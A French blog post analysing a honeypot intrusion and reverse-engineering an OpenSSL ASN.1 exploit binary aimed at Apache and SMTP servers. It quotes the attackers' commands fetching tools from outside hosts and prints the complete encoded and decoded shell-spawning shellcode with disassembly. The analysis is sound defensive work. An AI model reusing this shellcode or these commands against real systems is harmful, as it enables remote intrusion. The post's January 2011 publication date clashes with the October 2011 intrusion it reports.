---
title: "Mass Apache pwnage from Romania"
tags: [honeypot, reverse engineering, shellcoding]
---

Ça fait un bon moment que je n'avais [pas donné](http://devloop.users.sourceforge.net/index.php?article23/dernieres-visites-sur-le-honeypot-ssh) [de nouvelles]({% link _posts/2011-01-08-Intrusion-du-24-novembre-2006.md %}) de mon [honeypot SSH](http://devloop.users.sourceforge.net/index.php?article11/kojoney).  

Il faut dire que les visites sont assez rares et généralement peu intéressantes, se terminant par rapatriement d'un [EnergyMech](http://www.energymech.net/), d'un [PsyBNC](http://www.psybnc.co.uk/index.php/Main_Page) voire du [scanner UnixCod](http://devloop.users.sourceforge.net/index.php?article23/dernieres-visites-sur-le-honeypot-ssh) qui continue à faire parler de lui.  

Aujourd'hui j'ai l'occasion de vous parler de quelque chose de plus croustillant, qui tournera principalement sur l'analyse d'un binaire Linux.  

## L'intrusion

L'attaque a eu lieu le 25 octobre 2011. Une attaque bruteforce est lançée sur le faux serveur SSH à 14h11 et qui se terminera à 14h36. Il n'aura fallu q'une minute pour trouver les différents comptes avec mots de passes faibles.  

Le scan est en provenance de l'ip `121.2.28.199` qui fait partie du réseau du FAI *So-net*, un fournisseur d'accès japonais et filiale de *Sony*.  

Différents services tournent sur cette machine comme smtp, ftp (Microsoft FTP) et ssh (OpenSSH). Je n'ai pas cherché à en savoir plus mais il est fort possible que cette machine ait été infiltrée pour servir de relais aux pirates.  

À 14h25, un premier visiteur humain se connecte au serveur en se loguant directement avec le compte `test`. L'IP (`86.154.169.82`) est britannique et correspond au FAI *BT*. Le seul port TCP ouvert semble être le 5060 (SIP) et doit correspondre à une config par défaut des box fournies par le FAI.  

L'historique des commandes est le suivant :  

```console
14:25 w
14:26 passwd
14:26 passwd
14:28 cd
14:28 ls
14:29 get help-bnc.6te.net/psybnc-linux.tgz
14:29 wget help-bnc.6te.net/psybnc-linux.tgz
14:30 cdrl -O
14:31 curl -O 77.194.232.72help-bnc.6te.net/psybnc-linux.tgz
14:31 FTP
14:31 ftp
```

Rien de bien intéressant. L'intrus a voulu changer le mot de passe du compte `test` pour fermer l'accès derrière lui et, voyant que l'accès était refusé, a fait une nouvelle tentative. Il a ensuite essayé de télécharger un `PsyBNC` avant de laisser tomber.  

Le relais est pris par l'IP `82.77.174.40` à 14h35. Ce visiteur de Roumanie (le FAI *RCS&RDS* gère à peu près tout ce qui touche aux communications) se connecte là encore directement avec le login `test`. Il pourrait s'agir du collègue du premier ou encore du même visiteur qui a décidé de passer par un relais. Un petit coup de [myIPneighbors](http://www.myipneighbors.com/) nous apprend que différents sites Internet sont accessibles à cette adresse.  
Les commandes lancées sont les suivantes :  

```console
14:35 cd ..
14:35 cd ..
14:35 ls
14:35 wget
14:35 wget www.[retiré].us/p/scan/scan.tar
14:36 ftp -cv wave.prohosting.com
14:37 ls
14:37 csd ..
14:37 cd ..
14:38 chmod +x *
```

Là encore, le visiteur ne fera pas de vieux os. Il a toutefois tenté de rappatrier un outil de scan intéressant.  

## scan.tar

Contrairement à ce que l'extension du fichier laissait supposer, le fichier est bien compressé à l'aide de gzip. Une fois décompressé, l'analyse de l'archive `scan.tar` ne nous apprend rien de particulier (voir mon article sur [l'analyse de fichiers tar](http://devloop.users.sourceforge.net/index.php?article24/tarhison)). L'archive est au format `ustar` mais les noms d'user/group sont vides. Ce qui ne nous aurait pas appris grand-chose de toute façon car l'archive semble avoir été créée en tant que root. Par contre, on connait les dates de dernière modification des fichiers contenues dans l'archive sur le système du pirate.  

Les fichiers présents dans l'archive sont les suivants :  

* `e` : un exécutable 32 bits, lié dynamiquement, [strippé](http://linux.die.net/man/1/strip), datant du 4 juillet 2006.
* `ee` : un fichier texte, plus précisément une suite de ligne de commandes (mais sans entête de script bash). Le fichier est daté au 4 décembre 2006
* `SCANNER` : un exécutable 32 bits, lié dynamiquement, strippé et modifié pour la dernière fois le 26 septembre 2006.
* `vuln.txt` : un fichier texte avec des CRLF en caractères de terminaison. Daté du 16 juin 2007, il contient des adresses ips avec à chaque fois un entête de réponse HTTP associé.

Pour plus de détails, les commandes dans le fichier `ee` ressemblent à ceci :  

```bash
echo -e '\033[36m Exploiting \033[34m '$1'  \033[36m using apache 2.0.40 target 10 [Make by Evolver & Snake] \033[m'
./e -t 10 -r $1
./e -t 10 -r $1
...
```

Le script utilise le caractère d'échappement pour afficher des couleurs sur le terminal et exécute le binaire `e` avec le paramètre `-t` qui varie (bien qu'à chaque fois utilisé environ 10 fois) pour différentes versions d'Apache.  

Le paramètre qui doit être passé au script (`$1`) est une adresse IP comme nous le verrons un peu plus bas.  

Le fichier `vuln.txt` ressemble à ceci :  

```plain
200.241.116.58
HTTP/1.1 200 OK
Date: Thu, 14 Jun 2007 14:42:51 GMT
Server: Apache/1.3.27 (Unix) PHP/4.3.1 mod_ssl/2.8.12 OpenSSL/0.9.7a
Last-Modified: Sun, 15 Jun 2003 10:21:02 GMT
ETag: quot;20ab4-1-3eec488equot;
Accept-Ranges: bytes
Content-Length: 1
Connection: close
Content-Type: text/html

-------------------------------------------------------------------
200.241.204.37
HTTP/1.1 200 OK
Date: Thu, 14 Jun 2007 15:12:02 GMT
Server: Apache/2.0.44 (Unix) mod_ssl/2.0.44 OpenSSL/0.9.7a PHP/4.3.1 mod_jk/1.2.6
Connection: close
Content-Type: text/html; charset=ISO-8859-1

-------------------------------------------------------------------
```

Seul le format (une adresse IP, un header HTTP, une ligne de tirets) est à prendre en considération. On trouve aussi bien des entêtes Apache que IIS avec des configurations variables.  

## Analyse du binaire e

Bien que j'ai analysé les deux binaires, je me tiendrais ici à l'analyse de l'exécutable `e`, les deux binaires ayant des fonctions très proches. Le binaire fait 75.4 Ko soit 4ko de plus que celui nommé `SCANNER`.  

L'analyse a été faite seulement par désassemblage à l'aide de la dernière version de [HT Editor](http://hte.sourceforge.net/) (2.0.10) en suivant une méthodologie décrite [ici](http://devloop.users.sourceforge.net/index.php?article25/tutoriel-d-utilisation-de-ht-editor).  

Bien que le binaire ne semble pas contenir de backdoor, j'ai préféré ne pas exécuter le programme.  

Une fois à l'intérieur du `main`, la première chose que fait le programme est d'analyser les paramètres passés en argument. Pour cela il fait appel à la fonction `getopt_long()`. La chaine pour les arguments aux formats court est `hr:p:v:x:cz:s:e:t:`.  

On en apprend plus sur les paramètres par le biais des chaines de caractères utilisées dans un bout de code que j'ai baptisé `usage` et qui `puts()` les chaines suivantes :  

```plain
  -h, --help          - prints this help
  -r, --hostname      - which box you want hacked ?
                        (default: name returned by hostname function)
  -p, --port          - service port num - users connect
                        to it (https: 443, smtp: 25)
  -c, --check         - check only remote if it's exploitable, not exploit
  -x, --retaddr       - jmp *ecx / call *ecx instruction, (ff e1)
                        request use writeable address (default: 0xbfffe1ff)
                        frist unlink we will write it to some writeable address
  -z, --retloc        - free ()'s got address, some address we should rewrite it
                        (eg: objdump -R /path/httpd | grep free)
  -v, --verbose       - to be verbose
  -s, --gotaddr       - brute attack, guess the free's got address
                        (eg: 0x080xxxxx)
  -e, --stack_addr    - brute stack return address (default: 0xbffffefc)
  -t, --type          - try the knowns targets. (0 to list)
```

Cette aide est affichée dans plusieurs cas. Le premier si le nombre d'arguments (argc) n'est pas assez grand comme le montre ce code au début du `main` :  

```nasm
mov ebx, [ebp+8]
cmp ebx, 1
jng 0x0804b77b
```

Dans ce cas, le programme affiche d'abord la bannière suivante : `OpenSSL ASN1 deallocation exploit for linux/x86\n this copy for \e[32mrouter\e[0m\0`

Les deux autres cas d'affichage des options sont l'utilisation explicite de l'option `-h` et l'utilisation d'une option non existante.  

L'utilisation de `getopt_long()` ne facilite pas l'analyse du binaire, heureusement la page de manuelle nous apprend qu'une fois arrivée à la fin des options, la valeur -1 est retournée. On peut alors retrouver la suite de notre main :  

![optlong asm](/assets/img/e_optlong_main.jpg)

Le programme va afficher une bannière avant de faire un `signal(SIGPIPE, SIG_IGN)` pour empêcher que le programme quitte en cas d'erreur lors de la lecture sur un pipe.  
On a ensuite un test qui est effectué sur une variable que j'ai baptisé `port_443` (car initialisée à `0x1bb` = `443`, le port pour le HTTPS). Le programme compare simplement cette variable avec la valeur 25 (port SMTP), si la variable vaut effectivement 25, un booléen (baptisé `test_443_25` pour l'occasion) est mis à `true` puis on retourne à l'exécution logique du programme.  

L'exécution du programme va alors se séparer en différentes parties en fonction des options qui ont été passées au programme.  

Par exemple, on peut se retrouver sur une parcelle de code qui commence par l'affichage de la chaine `this mode only check remote exploitable, not exploit` qui correspond de toute évidence à l'utilisation de l'option `-c`.  

Les autres cheminements possibles sont le mode force brute (`-e`) et le mode *target* (`-t`).  

Ces différents modes font que l'on peut retrouver à différents endroits les mêmes opérations, l'auteur du programme ayant dû faire plusieurs copier/coller.  

Par la suite, le cheminement pris pour l'analyse du programme sera celui du mode brute force qui nous accueille avec l'avertissement suivant :  

> you've enter try to brute-force attack mode, it's will take a very long time, but will stop as soon as it considers that the correct got address could not be found, you are crazy, man :P

Deux variables sont ensuite initialisés. La première baptisée `leet` est initialisée à `0x7a69` (soit `31337`). Le programme fait différentes comparaisons tout au long de son exécution avec cette valeur, et s'en sert notamment pour savoir s'il est en mode verbeux.  

Quant à la seconde variable, je l'ai baptisée `stack_address`.  

Beaucoup de variables restent pour moi un mystère et il faudrait tracer l'exécution du programme pour déterminer leur rôle.  

Le programme appelle ensuite une fonction que j'ai baptisé `tcpConnect`.

## tcpConnect

`tcpConnect` est sans doute le nom original qui a été donné à cette fonction. En effet, toute erreur détectée à l'intérieur de cette fonction est remontée à l'aide de `perror()` et d'un message de la forme `tcpConnect:nom_de_la_fonction_qui_a_échoué`, par exemple `tcpConnect:gethostbyname`.  

Cette fonction a vraisemblablement été pompée sur [un](http://securityvulns.com/files/icecastex.c) ou [deux](http://www.digitalmunition.com/ex_gpsd.c) exploits existants.  

Cette fonction prend trois paramètres : le nom de la machine à attaquer, le port à utiliser ainsi qu'un timeout pour la connexion spécifié en millisecondes (4000 pour la première connexion établie en mode brute force).  

En comparant le binaire et les codes sources disponibles pour la fonction `tcpConnect`, on retrouve bien certains passages comme le remplissage des structures `hostent` et `timeval`.
La fonction retourne le socket créé si la connexion a réussi ou la valeur `-1` dans le cas contraire.  

Au retour du `main`, le résultat de `tcpConnect` est vérifié. Si la connexion n'a pas pû être établie, on est redirigé vers une fonction que j'ai baptisée `print_error_and_exit` (je crois que c'est assez parlant).  

## HTTPS ou SMTP ?

Si la connexion a réussi, le programme continue son exécution en testant notre variable `test_443_25`.  
Dans le cas d'un port SMTP (valeur = 1), des instructions supplémentaires sont effectuées : la fonction `readData` est appelée pour lire les données envoyées par le serveur SMTP et le code d'erreur récupéré à l'aide de `strtol()`. Si le code est 220, le programme ne quitte pas.  

## readData et writeData

Le nom de la fonction est là encore assez explicite car utilisé dans les messages d'appels à `strerror`.  

Pour résumer, cette fonction est une interface verbeuse de `recv()` et prends les mêmes arguments : socket, buffer et taille du buffer.  

Le nombre d'octets lus est retourné ou -1 en cas d'erreur.  

De la même façon, `writeData` est une interface pour la fonction `write()` et prend pour arguments le socket, le buffer et sa taille.   

## SMTP

Toujours dans la partie spécifique au protocole SMTP, le programme va se mettre à communiquer avec le serveur en envoyant la commande `STARTTLS` à l'aide de `writeData`.  

L'utilisation de cette commande est expliquée dans le document [SMTP Service Extension for Secure SMTP over TLS](http://tools.ietf.org/id/draft-hoffman-smtp-ssl-02.txt) :  

> 5. The STARTTLS Command  
> 
> The format for the STARTTLS command is:  
> 
> STARTTLS token  
> 
> where the token parameter is one of the tokens described in Section 4.  
> 
> After the client gives the STARTTLS command, the server responds with one of the following reply codes:  
> 
> * 220 - Ready to start TLS
> * 501 - Syntax error (more than one parameter)
> * 504 - TLS not available due to the server not being able to use the specified protocol
> * 554 - TLS not available due to some other, temporary reason
> 
> A publicly-referenced server SHOULD be able to accept other SMTP commands before receiving a STARTTLS command. After receiving a 220 response to a STARTTLS command, the client MUST start the TLS procedure immediately.

Comme on s'y attend, le programme vérifie à nouveau la réponse. Si on a un code 220 alors tout est ok.  

La partie spécifique au SMTP se termine et passe à des routines spécifiques au SSL/TLS.  

Les noms que j'ai pu donner à ces routines ne correspondent pas forcément bien à leur rôle, les opérations étant difficiles à comprendre sans connaître en détail le protocole SSL.  

## SSL et TLS

La première fonction appelée est `send_client_hello`. Une fonction très courte qui prend comme argument le socket et notre variable `leet` qui est ici utilisée pour activer ou non le mode verbeux (si égal à `31337`).  

La première vérification effectuée est de savoir si le protocole utilisé est le SSL3 ou le TLS1. Pour cela la variable `is_ssl3_or_tls1` est lue et son contenu (un octet) vient remplacer certains caractères (3ᵉ et 11ᵉ) d'un buffer envoyé ensuite par `writeData`.  

Le buffer en question est préinitialisé à `\0x16\x03\xcc\x00\x61\x01\x00\x00\x5d\x03?AAAAAAAA...`

La réponse du serveur est obtenue par `check_handshake`. La encore une fonction assez courte mais qui fait appelle à une fonction plus importante nommée `read_handshake`.  

Cette dernière alloue de la place pour de grosses zones mémoires qui sont mises à zéro par `memset()` avant d'être remplies par la réponse du serveur. Un nombre important de vérification est alors fait pour s'assurer que le handshake a réussi sans quoi on passe par une fonction `handshake_error` qui affiche une erreur puis `switch` le SSL3 pour une utilisation du TLS1 (le message d'erreur est explicite).  

## Vulnérabilité OpenSSL

D'après l'output du programme, la faille exploité est *OpenSSL ASN1 deallocation* qui semble être plus connue sous le nom [OpenSSL ASN.1 Parsing Vulnerabilities](http://www.securityfocus.com/bid/8732/info).  

La [description CVE de cette vulnérabilité](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2003-0545) est la suivante :  

> Double-free vulnerability in OpenSSL 0.9.7 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via an SSL client certificate with a certain invalid ASN.1 encoding.

Cette description s'accorde bien avec l'option `-z` du programme.  

Certains exploits existent déjà pour cette vulnérabilité comme [un brute forcer](http://downloads.securityfocus.com/vulnerabilities/exploits/ASN.1-Brute.c) ou le [openssl-too-open](http://www.phreedom.org/solar/exploits/apache-openssl/) de *Solar Eclipse* dont certaines parties de code ont (à mon avis) été reprises pour ce binaire.  

*Core Impact* a à priori aussi un exploit pour cette vulnérabilité, je ne serais pas surpris qu'il y ait aussi des similitudes avec celui-ci.  

## Pwnage

Maintenant que la connexion sécurisée a été établie, la phase d'exploitation commence vraiment.  

La fonction `exploit` fait une bonne taille. Elle prend 4 arguments, le premier étant le socket, le second un offset (adresse de retour) et le quatrième est notre variable `leet` qui permet d'activer le mode verbeux. A l'heure actuelle le rôle du troisième argument m'échappe toujours.  

Comme pour `read_handshake`, de nombreuses opérations sont effectuées sur des buffers. La première étape est la lecture de données venant du serveur puis le calcul d'un buffer baptisé `mega_buf1`, modifié en fonction du protocole (SSL3 ou TLS1) pour répondre au serveur.  

D'autres paquets de données sont envoyés dans la foulée (`mega_buf2` et `mega_buf3`) donc le rôle semble être totalement protocolaire.  

Le programme effectue ensuite une pause d'une seconde avant d'envoyer le shellcode ainsi que l'offset.  

## Shellcoding fun

Voici un hexdump du shellcode une fois extrait du binaire :  

```plain
90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
eb 0e 5a 4a 31 c9 b1 99  80 34 11 fa e2 fa eb 05  |..ZJ1....4......|
e8 ed ff ff ff 13 7d fa  fa fa a5 cb 33 4f fe 73  |......}.....3O.s|
31 ab cb 33 4b f9 cb 28  cb 3a 4a cd 37 7a 73 3c  |1..3K..(.:J.7zs<|
73 38 7a 34 f2 bb cb 3a  4a cd 37 7a 73 30 77 b5  |s8z4...:J.7zs0w.|
f2 73 2a b2 37 7a 73 2b  73 08 cb 3a 4a cd 37 7a  |.s*.7zs+s..:J.7z|
a3 7b 85 f2 94 9f 8c 9f  8e fe 18 39 11 47 cb 3a  |.{.........9.G.:|
aa 92 8d ca ca 8e 73 1b  4a fe 73 38 37 7a cb 33  |......s.J.s87z.3|
cb 3a 4a c5 37 7a bb cb  3a 4a c5 37 7a bb cb 3a  |.:J.7z..:J.7z..:|
4a c5 37 7a 73 01 73 a5  f2 cb 3a 73 bd f6 72 bd  |J.7zs.s...:s..r.|
fd cb 28 77 b5 f2 4a f1  37 7a cb 21 73 22 ba 37  |..(w..J.7z.!s".7|
7a 12 8e 05 05 05 d5 98  93 94 d5 89 92 c5 00     |z..............|
```

On remarque la présence de NOP (`0x90`) au début, suivi d'un saut (`0xeb`) qui permettent de le reconnaître facilement.  

En revanche la suite n'a rien de bien habituelle, en particulier on note l'absence de la chaine _/bin/sh_.  

Pour comprendre le fonctionnement du shellcode, on le place dans un fichier et on tape `ndisasm -u shellcode` :  

```nasm
00000010  EB0E              jmp short 0x20
00000012  5A                pop edx
00000013  4A                dec edx
00000014  31C9              xor ecx,ecx
00000016  B199              mov cl,0x99
00000018  803411FA          xor byte [ecx+edx],0xfa
0000001C  E2FA              loop 0x18
0000001E  EB05              jmp short 0x25
00000020  E8EDFFFFFF        call 0x12
00000025  137DFA            adc edi,[ebp-0x6]
...
```

La raison pour laquelle le shellcode n'est en grande partie pas lisible, c'est qu'une partie est crypté à l'aide d'un XOR.  

Le code effectue un saut vers l'instruction call à l'adresse 20. Le call le ramène à la seconde instruction avec l'adresse du reste du shellcode dans la pile (car aucun `ret` n'a été effectué). Cette adresse est récupérée et placée dans `edx`.  

Tout le code à partir de cette adresse est décodé à l'aide d'un XOR avec `0xfa` sur une longueur de 153 (`0x99`) octets.  
Une fois décodé, le code qui nous manquait est :  

```plain
e9 87 00 00 00 5f 31 c9  b5 04 89 cb 51 31 c9 b1  |....._1.....Q1..|
03 31 d2 31 c0 b0 37 cd  80 89 c6 89 c2 80 ce 08  |.1.1..7.........|
41 31 c0 b0 37 cd 80 89  ca 8d 4f 08 89 d0 48 cd  |A1..7.....O...H.|
80 89 d1 89 f2 31 c0 b0  37 cd 80 59 81 7f 08 6e  |.....1..7..Y...n|
65 76 65 74 04 e2 c3 eb  bd 31 c0 50 68 77 30 30  |evet.....1.Phw00|
74 89 e1 b0 04 89 c2 cd  80 31 c9 31 c0 b0 3f cd  |t........1.1..?.|
80 41 31 c0 b0 3f cd 80  41 31 c0 b0 3f cd 80 89  |.A1..?..A1..?...|
fb 89 5f 08 31 c0 89 47  0c 88 47 07 31 d2 8d 4f  |.._.1..G..G.1..O|
08 b0 0b cd 80 31 db 89  d8 40 cd 80 e8 74 ff ff  |.....1...@...t..|
ff 2f 62 69 6e 2f 73 68  3f fa                    |./bin/sh?.|
```

Soit les instructions suivantes :  

```nasm
00000000  E987000000        jmp 0x8c
00000005  5F                pop edi
00000006  31C9              xor ecx,ecx
00000008  B504              mov ch,0x4
0000000A  89CB              mov ebx,ecx
0000000C  51                push ecx
0000000D  31C9              xor ecx,ecx
0000000F  B103              mov cl,0x3
00000011  31D2              xor edx,edx
00000013  31C0              xor eax,eax
00000015  B037              mov al,0x37 ; fcntl
00000017  CD80              int 0x80
00000019  89C6              mov esi,eax
0000001B  89C2              mov edx,eax
0000001D  80CE08            or dh,0x8
00000020  41                inc ecx
00000021  31C0              xor eax,eax
00000023  B037              mov al,0x37 ; fcntl
00000025  CD80              int 0x80
00000027  89CA              mov edx,ecx
00000029  8D4F08            lea ecx,[edi+0x8]
0000002C  89D0              mov eax,edx
0000002E  48                dec eax
0000002F  CD80              int 0x80    ; read
00000031  89D1              mov ecx,edx
00000033  89F2              mov edx,esi
00000035  31C0              xor eax,eax
00000037  B037              mov al,0x37 ; fcntl
00000039  CD80              int 0x80
0000003B  59                pop ecx
0000003C  817F086E657665    cmp dword [edi+0x8],0x6576656e ; even/neve
00000043  7404              jz 0x49
00000045  E2C3              loop 0xa
00000047  EBBD              jmp short 0x6
00000049  31C0              xor eax,eax
0000004B  50                push eax
0000004C  6877303074        push dword 0x74303077 ; t00w/w00t
00000051  89E1              mov ecx,esp
00000053  B004              mov al,0x4  ; write
00000055  89C2              mov edx,eax
00000057  CD80              int 0x80
00000059  31C9              xor ecx,ecx ; stdin
0000005B  31C0              xor eax,eax
0000005D  B03F              mov al,0x3f ; dup2
0000005F  CD80              int 0x80
00000061  41                inc ecx     ; stdout
00000062  31C0              xor eax,eax
00000064  B03F              mov al,0x3f ; dup2
00000066  CD80              int 0x80
00000068  41                inc ecx     ; stderr
00000069  31C0              xor eax,eax
0000006B  B03F              mov al,0x3f ; dup2
0000006D  CD80              int 0x80
0000006F  89FB              mov ebx,edi
00000071  895F08            mov [edi+0x8],ebx
00000074  31C0              xor eax,eax
00000076  89470C            mov [edi+0xc],eax
00000079  884707            mov [edi+0x7],al
0000007C  31D2              xor edx,edx
0000007E  8D4F08            lea ecx,[edi+0x8]
00000081  B00B              mov al,0xb  ; execve
00000083  CD80              int 0x80
00000085  31DB              xor ebx,ebx
00000087  89D8              mov eax,ebx
00000089  40                inc eax
0000008A  CD80              int 0x80    ; exit
0000008C  E874FFFFFF        call 0x5
00000091  2F62696E2F7368    /bin/sh
00000098  3F                aas
00000099  FA                cli
```

## check_exploit_result

Le shellcode est en grande partie facilement compréhensible : il redirige les entrées/sorties vers un beau `/bin/sh` prêt à servir.  

Pourtant, juste avant il effectue un `read()` puis un `write()` pour le moins énigmatiques.  

Le mystère est levé par un appel à la fonction `check_exploit_result` qui vient directement après l'appel à `exploit`.  

`check_exploit_result` prend pour seul argument le socket de la connexion. Il commence par envoyer la chaine `neve` au serveur puis attend une réponse de la part du serveur. Si la réponse contient `w00t`, le programme affiche un message de victoire (`w3 g0t 1t`) et passe à une fonction `get_shell` qui envoie quelques commandes pour configurer le shell distant puis récupère ce qui est tapé à la console pour le renvoyer sur le socket et vice/versa.  

Le code du shellcode de son côté va lire les données venant du client, et si le message est `neve`, il renvoie la réponse `w00t`.  
Un test pratique pour déterminer si le shellcode a bien été exécuté :)  

## Exit

Pour conclure, le binaire était très intéressant et a sans doute peu circulé à l'heure actuelle. Il semble aller plus loin dans l'exploitation de la vulnérabilité d'OpenSSL en prenant en compte le protocole TLS1 et en s'attaquant aussi aux services de *"Secure SMTP over TLS"*.  

L'autre binaire est assez proche à la différence qu'il s'agit d'un scanneur : on lui passe une plage d'adresses IP et il va chercher des machines vulnérables sans les exploiter (la code correspond au mode `-c` du binaire analysé). Quand il en trouve une il les rajoute au fichier `vuln.txt` dont on a vu la structure au début.  

Et pendant que j'y pense, dans le scanner on trouve des mots en roumain alors qu'il n'y en a pas dans le binaire `e`.  

La meilleure façon de se protéger de cette attaque est d'être à jour de ses logiciels, les offsets proposés par le programme correspondant aux versions suivantes : 

```
SuSE 9.0 (apache-1.3.28-60.i586.rpm)
SuSE 9.0 (apache2-leader-2.0.48-9.i586.rpm)
SuSE 9.0 (apache2-metuxmpm-2.0.48-9.i586.rpm)
SuSE 9.0 (apache2-prefork-2.0.48-9.i586.rpm)
SuSE 9.0 (apache2-worker-2.0.48-9.i586.rpm)
Mandrake 9.1 (apache2-2.0.44-11mdk.i586.rpm)
Mandrake 9.1 (apache2-2.0.47-1.6.91mdk.i586.rpm)
Mandrake 9.2 (apache2-2.0.47-6mdk.i586.rpm)
Mandrake 9.2 (apache2-2.0.47-6.3.92mdk.i586.rpm)
Red Hat 9 (httpd-2.0.40-21.i386.rpm - httpd)
Red Hat 9 (httpd-2.0.40-21.i386.rpm - httpd.worker)
Red Hat 9 (httpd-2.0.40-21.3.i386.rpm - httpd)
Red Hat 9 (httpd-2.0.40-21.9.i386.rpm - httpd)
Red Hat 9 (httpd-2.0.40-21.9.i386.rpm - httpd.worker)
```

*Published January 11 2011 at 06:56*
